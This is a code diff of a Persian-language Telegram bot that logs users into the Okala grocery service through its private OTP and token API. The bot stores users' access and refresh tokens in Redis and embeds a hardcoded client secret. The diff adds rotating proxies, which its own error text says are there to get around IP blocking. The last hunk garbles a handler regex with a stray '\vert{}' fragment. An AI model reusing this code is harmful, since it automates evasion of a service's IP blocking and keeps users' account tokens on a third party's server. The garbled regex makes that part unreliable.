@@ -26,7 +26,6 @@ redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
 WEB_DOMAIN = os.environ.get("WEB_DOMAIN", "http://localhost:8080")
 ADMIN_IDS = [7701391471, 8743187576]
 
-
 PHONE, OTP, ASK_NAME = range(3)
 
 executor = ThreadPoolExecutor(max_workers=5)
@@ -760,7 +759,7 @@ async def core_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['admin_state'] = 'waiting_for_proxy'
         await query.edit_message_text("🌐 <b>تنظیم پروکسی‌ها:</b>\nمتن پروکسی‌ها یا فایل `.txt` را بفرستید.", parse_mode='HTML')
 
-# ================= توابع لاگین کاربر =================
+# ================= توابع لاگین کاربر با پروکسی و سیستم مدیریت خطا =================
 def get_user_headers(context: ContextTypes.DEFAULT_TYPE):
     if 'device_id' not in context.user_data:
         context.user_data['device_id'] = str(uuid.uuid4())
@@ -769,11 +768,6 @@ def get_user_headers(context: ContextTypes.DEFAULT_TYPE):
     headers['X-User-Unique-Id'] = context.user_data['device_id']
     headers['session-id'] = context.user_data['session_id']
     return headers
-
-async def async_request(method, url, **kwargs):
-    loop = asyncio.get_running_loop()
-    if method.upper() == 'POST': return await loop.run_in_executor(executor, lambda: requests.post(url, **kwargs))
-    return await loop.run_in_executor(executor, lambda: requests.get(url, **kwargs))
 
 async def check_maintenance(update: Update) -> bool:
     maint = await redis_client.get("settings:maintenance")
@@ -812,65 +806,141 @@ async def cancel_process_callback(update: Update, context: ContextTypes.DEFAULT_
 async def request_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     if await check_maintenance(update): return ConversationHandler.END
     phone = update.message.text.strip()
+    
+    # سیستم محدودیت زمانی پیامک (Cooldown)
+    ttl = await redis_client.ttl(f"otp_cooldown:{phone}")
+    if ttl > 0:
+        minutes, seconds = divmod(ttl, 60)
+        time_str = f"{minutes} دقیقه و {seconds} ثانیه" if minutes > 0 else f"{seconds} ثانیه"
+        await update.message.reply_text(f"⏳ پیامک به تازگی برای این شماره ارسال شده است.\nلطفاً {time_str} صبر کنید و سپس دوباره تلاش کنید.", parse_mode='HTML')
+        return PHONE
+        
     context.user_data['phone'] = phone
+    msg = await update.message.reply_text("⏳ در حال ارتباط با سرور و ارسال پیامک...")
+    
     url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister"
     payload = {"mobile": phone, "deviceTypeCode": 7, "confirmTerms": True, "notRobot": False, "otpType": 0, "ValidationCodeCreateReason": 5, "OtpApp": 0, "IsAppOnly": False}
-    response = await async_request('POST', url, json=payload, headers=get_user_headers(context), timeout=15)
-    if response.status_code == 200:
-        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 ارسال مجدد کد ورود", callback_data="resend_otp")], [InlineKeyboardButton("❌ کنسل عملیات", callback_data="cancel_action")]])
-        await update.message.reply_text("✉️ <b>کد تایید ارسال شد.</b>\nلطفاً آن را وارد کنید:", reply_markup=kb, parse_mode='HTML')
-        return OTP
-    else:
-        await update.message.reply_text(f"❌ خطا در ارتباط با سیستم: <code>{response.status_code}</code>", parse_mode='HTML')
+    proxy_dict = await get_random_proxy_from_db()
+    
+    try:
+        loop = asyncio.get_running_loop()
+        response = await loop.run_in_executor(
+            executor, 
+            lambda: requests.post(url, json=payload, headers=get_user_headers(context), proxies=proxy_dict, timeout=15)
+        )
+        
+        if response.status_code == 200:
+            # اعمال محدودیت زمانی 2 دقیقه ای برای شماره
+            await redis_client.setex(f"otp_cooldown:{phone}", 120, "1") 
+            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 ارسال مجدد کد ورود", callback_data="resend_otp")], [InlineKeyboardButton("❌ کنسل عملیات", callback_data="cancel_action")]])
+            await msg.edit_text("✉️ <b>کد تایید ارسال شد.</b>\nلطفاً آن را وارد کنید:", reply_markup=kb, parse_mode='HTML')
+            return OTP
+        else:
+            await msg.edit_text(f"❌ خطا از سمت سیستم اکالا: <code>{response.status_code}</code>", parse_mode='HTML')
+            return ConversationHandler.END
+            
+    except Exception as e:
+        logging.error(f"Error in OTP request: {e}")
+        await msg.edit_text("❌ خطا در ارتباط با سرور (احتمالاً پروکسی قطع است یا IP مسدود شده).\nلطفاً دوباره تلاش کنید.")
         return ConversationHandler.END
 
 async def resend_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     query = update.callback_query
     phone = context.user_data.get('phone')
+    
+    # چک کردن محدودیت زمانی قبل از ارسال مجدد
+    ttl = await redis_client.ttl(f"otp_cooldown:{phone}")
+    if ttl > 0:
+        minutes, seconds = divmod(ttl, 60)
+        time_str = f"{minutes} دقیقه و {seconds} ثانیه" if minutes > 0 else f"{seconds} ثانیه"
+        await query.answer(f"⏳ لطفاً {time_str} دیگر صبر کنید.", show_alert=True)
+        return OTP
+
     await query.answer("در حال ارسال مجدد کد... ⏳")
+    
     url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister"
     payload = {"mobile": phone, "deviceTypeCode": 7, "confirmTerms": True, "notRobot": False, "otpType": 0, "ValidationCodeCreateReason": 5, "OtpApp": 0, "IsAppOnly": False}
-    response = await async_request('POST', url, json=payload, headers=get_user_headers(context), timeout=15)
-    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 ارسال مجدد کد ورود", callback_data="resend_otp")], [InlineKeyboardButton("❌ کنسل عملیات", callback_data="cancel_action")]])
-    if response.status_code == 200: await query.edit_message_text(f"✉️ <b>کد تایید مجدداً ارسال شد.</b>\nکد را وارد کنید:", reply_markup=kb, parse_mode='HTML')
-    else: await query.edit_message_text(f"❌ خطا در ارسال مجدد: <code>{response.status_code}</code>", reply_markup=kb, parse_mode='HTML')
+    proxy_dict = await get_random_proxy_from_db()
+    
+    try:
+        loop = asyncio.get_running_loop()
+        response = await loop.run_in_executor(
+            executor, 
+            lambda: requests.post(url, json=payload, headers=get_user_headers(context), proxies=proxy_dict, timeout=15)
+        )
+        
+        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 ارسال مجدد کد ورود", callback_data="resend_otp")], [InlineKeyboardButton("❌ کنسل عملیات", callback_data="cancel_action")]])
+        if response.status_code == 200:
+            await redis_client.setex(f"otp_cooldown:{phone}", 120, "1")
+            await query.edit_message_text(f"✉️ <b>کد تایید مجدداً ارسال شد.</b>\nکد را وارد کنید:", reply_markup=kb, parse_mode='HTML')
+        else:
+            await query.edit_message_text(f"❌ خطا در ارسال مجدد: <code>{response.status_code}</code>", reply_markup=kb, parse_mode='HTML')
+    except Exception as e:
+        await query.edit_message_text("❌ خطا در ارتباط با سرور هنگام ارسال مجدد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ کنسل", callback_data="cancel_action")]]))
+        
     return OTP 
 
 async def verify_otp_and_check_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     otp_code = update.message.text.strip()
     phone = context.user_data.get('phone')
-    msg = await update.message.reply_text("⏳ در حال پردازش درخواست...")
+    msg = await update.message.reply_text("⏳ در حال بررسی کد تایید...")
+    
     token_url = "https://apigateway.okala.com/api/v1/accounts/tokens"
     payload = {"mobile_number": phone, "otp_code": otp_code, "grant_type": "customer_grant_type", "client_id": "customer_client_id", "client_secret": "u_M{'57j!%LI21#", "client_name": "customer_client_name", "device_type_code": 7, "scope": "offline_access", "loginDuration": 4815}
     headers = get_user_headers(context)
     headers["Content-Type"] = "application/x-www-form-urlencoded"
-    response = await async_request('POST', token_url, data=payload, headers=headers)
+    proxy_dict = await get_random_proxy_from_db()
     
-    if response.status_code == 200:
-        auth_data = response.json()
-        context.user_data['auth_data'] = auth_data 
-        if auth_data.get("access_token"):
-            await redis_client.hset(f"account:{phone}", mapping={"access_token": auth_data.get("access_token"), "refresh_token": auth_data.get("refresh_token")})
-        if not auth_data.get("UserInfo", {}).get("HasName", False):
-            kb = InlineKeyboardMarkup([[InlineKeyboardButton("❌ کنسل عملیات", callback_data="cancel_action")]])
-            await msg.edit_text("⚠️ <b>اطلاعات حساب ناقص است.</b>\nلطفاً نام و نام خانوادگی خود را وارد کنید:", reply_markup=kb, parse_mode='HTML')
-            return ASK_NAME
-        else: return await generate_and_send_link(update, context, msg)
-    else:
-        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 ارسال مجدد کد ورود", callback_data="resend_otp")], [InlineKeyboardButton("❌ کنسل عملیات", callback_data="cancel_action")]])
-        await msg.edit_text("❌ کد وارد شده اشتباه یا منقضی است.\nمجدداً تلاش کنید.", reply_markup=kb)
-        return OTP 
+    try:
+        loop = asyncio.get_running_loop()
+        response = await loop.run_in_executor(
+            executor, 
+            lambda: requests.post(token_url, data=payload, headers=headers, proxies=proxy_dict, timeout=15)
+        )
+        
+        if response.status_code == 200:
+            auth_data = response.json()
+            context.user_data['auth_data'] = auth_data 
+            if auth_data.get("access_token"):
+                await redis_client.hset(f"account:{phone}", mapping={"access_token": auth_data.get("access_token"), "refresh_token": auth_data.get("refresh_token")})
+            if not auth_data.get("UserInfo", {}).get("HasName", False):
+                kb = InlineKeyboardMarkup([[InlineKeyboardButton("❌ کنسل عملیات", callback_data="cancel_action")]])
+                await msg.edit_text("⚠️ <b>اطلاعات حساب ناقص است.</b>\nلطفاً نام و نام خانوادگی خود را وارد کنید:", reply_markup=kb, parse_mode='HTML')
+                return ASK_NAME
+            else: 
+                return await generate_and_send_link(update, context, msg)
+        else:
+            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 ارسال مجدد کد ورود", callback_data="resend_otp")], [InlineKeyboardButton("❌ کنسل عملیات", callback_data="cancel_action")]])
+            await msg.edit_text("❌ کد وارد شده اشتباه یا منقضی است.\nمجدداً تلاش کنید.", reply_markup=kb)
+            return OTP 
+            
+    except Exception as e:
+        logging.error(f"Error verifying OTP: {e}")
+        kb = InlineKeyboardMarkup([[InlineKeyboardButton("❌ کنسل", callback_data="cancel_action")]])
+        await msg.edit_text("❌ خطا در ارتباط با سرور. لطفاً مجدد تلاش کنید.", reply_markup=kb)
+        return OTP
 
 async def save_name_and_continue(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     full_name = update.message.text.strip()
     if not full_name: return ASK_NAME
     parts = full_name.split(maxsplit=1)
     msg = await update.message.reply_text("⏳ در حال ثبت اطلاعات...")
+    
     url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/UpdateCustomer" 
     headers = get_user_headers(context)
     headers["Authorization"] = f"Bearer {context.user_data['auth_data'].get('access_token')}"
     payload = {"birthDate": "", "birthDateEpoch": 700086600, "customerType": 0, "firstName": parts[0], "genderCode": 1, "genderTitle": "مذکر", "lastName": parts[1] if len(parts)>1 else "", "gender": "male"}
-    await async_request('POST', url, json=payload, headers=headers)
+    proxy_dict = await get_random_proxy_from_db()
+    
+    try:
+        loop = asyncio.get_running_loop()
+        await loop.run_in_executor(
+            executor,
+            lambda: requests.post(url, json=payload, headers=headers, proxies=proxy_dict, timeout=15)
+        )
+    except Exception:
+        pass # خطا در تنظیم نام مانع ساخت لینک نمی‌شود
+        
     return await generate_and_send_link(update, context, msg)
 
 async def generate_and_send_link(update: Update, context: ContextTypes.DEFAULT_TYPE, status_msg) -> int:
@@ -947,7 +1017,7 @@ async def main():
     )
     application.add_handler(conv_handler)
     
-    application.add_handler(CallbackQueryHandler(core_callback, pattern="^admin_|^main_menu$|^admin_panel$|^finish_link_creation$|^get_my_links$"))
+    application.add_handler(CallbackQueryHandler(core_callback, pattern="^admin_|^main_menu$\vert{}^admin_panel$|^finish_link_creation$\vert{}^get_my_links$"))
     application.add_handler(MessageHandler(filters.TEXT | filters.Document.FileExtension("txt"), handle_admin_text_document))
 
     await application.initialize()
